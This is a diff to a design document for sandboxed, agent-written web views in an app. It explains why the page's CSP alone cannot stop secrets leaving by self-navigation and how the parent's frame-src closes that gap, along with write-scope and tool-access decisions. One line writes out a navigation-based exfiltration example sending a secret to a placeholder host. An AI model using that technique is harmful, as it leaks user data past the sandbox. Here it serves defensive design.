@@ -65,6 +65,17 @@ let a request **leave** a null origin (it only withholds the response), so
 "cannot read the answer" is not "cannot exfiltrate". `default-src 'none'` with no
 `connect-src` of its own is what actually closes it.
 
+**And it is not enough on its own.** CSP has no directive a document can use to
+stop ITSELF navigating — `navigate-to` was dropped from CSP3 and never shipped —
+so `location.href = "https://x/?d=" + secret` walked past every clause above,
+measured in Chromium with fetch, beacon, WebSocket, image, popup, nested frame
+and form submission all confirmed refused. The close is `SPA_CSP`'s `frame-src`
+on the CONTAINING document (`api/spa.py`), the only actor with a say over a
+child frame's navigation. It also removes the second half of the same hole: a
+navigated-away frame keeps its `WindowProxy`, so the parent's replies —
+necessarily `postMessage(…, "*")`, since an opaque origin cannot be named —
+would have been handed to whatever then occupied it.
+
 ## Locked decisions
 
 Each of these was argued and settled; the reason is the part worth keeping.
@@ -83,6 +94,11 @@ Each of these was argued and settled; the reason is the part worth keeping.
 4. **Reads the whole item workspace; writes and deletes only its own folder.**
    Read broadly (secondary analysis of the item's real data is a first-class use);
    write narrowly, so a page cannot overwrite `notes.md` or the folder next door.
+   A view file at the workspace **root** has no folder of its own, and the honest
+   reading of "only its own folder" is then *nothing*: it can read, and every
+   write is refused. Treating it as the whole workspace — which is what shipped
+   first, with a test pinning it — deleted the invariant for exactly the case a
+   hand-written view file reaches.
 5. **A folder is a WUI iff it contains a `*.ai.yaml` with `view: wui`.** Inferring
    from "has an `index.html`" would misfire on a downloaded page or an exported
    report. Explicit opt-in, and the yaml is where the declaration lives — so no
@@ -99,8 +115,10 @@ Each of these was argued and settled; the reason is the part worth keeping.
    - `deleteFile` is granted because **write already subsumes destruction** in the
      same scope (overwrite with nothing). Refusing delete removes no risk and
      leaves a page unable to clean up files it created, which only grows quota.
-   - **First-party tools are NOT reachable.** Not for semantic reasons — those a
-     whitelist could fix — but for *type* reasons: `read_file_impl` truncates by
+   - **The agent's BUILT-IN tools are not reachable** (`read_file`, `exec`, …).
+     Not "first-party", which in this codebase names the bundled `sample-tools`
+     packages — those ARE reachable. And not for semantic reasons, which a
+     whitelist could fix, but for *type* reasons: `read_file_impl` truncates by
      line and char budget, appends `[truncated: …]` **to the data**, returns
      errors as prose (`"error: file not found: …"`), and decodes with
      `errors="replace"`. Those are correct choices for an LLM and wrong for a
@@ -124,7 +142,12 @@ Each of these was argued and settled; the reason is the part worth keeping.
     wasteful WUI is visible, attributable, and fixable by fixing the WUI. Building
     machinery for an unmeasured problem is inferring a defect from call counts.
     **Guardrails only cover what a user cannot fix by editing their page**: the
-    CSP, the folder write scope, and the capability declaration.
+    CSP (both of them), the folder write scope, and the capability declaration.
+    One bound sits on OUR side of the line and belongs there — the pane keeps at
+    most `MAX_REPORTS` reports. That is not policing how well the page runs; an
+    unbounded list re-rendered per message freezes the whole workspace, including
+    the button that would clear it, so the thing being protected is the app
+    around the page, not the page.
 11. **The agent learns WUI from a shared skill, not the system prompt.** A skill
     is a folder (`SKILL.md` + `references/` + a complete runnable example) whose
     body loads on demand, so a turn that never mentions WUI pays two lines. The
@@ -133,7 +156,11 @@ Each of these was argued and settled; the reason is the part worth keeping.
     for small local models.
     - The list of tools this app exposes to `callTool` is **dynamic** and cannot
       live in the skill. The model cannot tell `data-fetch` from `read_file` by
-      name, so the host must name the WUI-callable set explicitly.
+      name, so the host names the WUI-callable set explicitly, appended to the
+      skill body at read time (`describe_wui_tools`) off the SAME resolved
+      packages and allow-list the turn's toolset was built from. Where a caller
+      has no resolved toolset to ask, the section is omitted rather than rendered
+      empty: "this app grants none" and "nobody asked" are different claims.
 12. **Errors are caught by our injected runtime, never by the agent's code.** A
     blank page is where "the domain expert does it themselves" breaks: they cannot
     open a console, and the agent cannot see the browser. The runtime catches
@@ -154,13 +181,16 @@ Each of these was argued and settled; the reason is the part worth keeping.
     frontmatter helper belongs in the skill's example, or in an App's own skill.
 15. **Discovery is deliberately deferred** until the trial. The skill is
     registered in `SHARED_SKILLS` but declared by **no app** — an app opts in
-    with one line in its `agent.skills` when it is ready. (Declaring it and
-    turning it off is not the same thing: a shared skill is default-ON unless the
-    profile pins an explicit `skills` list, and pinning one for `rca/default`
-    would change the defaults of four unrelated skills to hide this one.) No
-    feature flag, nothing to remove later. Note the asymmetry: the renderer ships
-    to everyone, so a hand-written `view: wui` file already works. What is gated
-    is whether the *agent* proposes one, not whether the platform can run one.
+    with one line in its `agent.skills` when it is ready. Declaring it and
+    switching it off is a real alternative (a profile can pin a `skills` list, as
+    `pm` already does) and was rejected for a different reason than first written
+    down: a declared skill puts a row named `wui` in every item's skill picker,
+    which is precisely the finding-out being deferred. The cost is that enabling
+    it later is an `app.json` line rather than a per-item toggle. No feature flag,
+    nothing to remove. Note the asymmetry: the renderer ships to everyone, so a
+    hand-written `view: wui` file already works, and `read_skill("wui")` resolves
+    in any app. What is gated is whether the *agent* is TOLD, not whether the
+    platform can run one.
 
 ## Phases
 
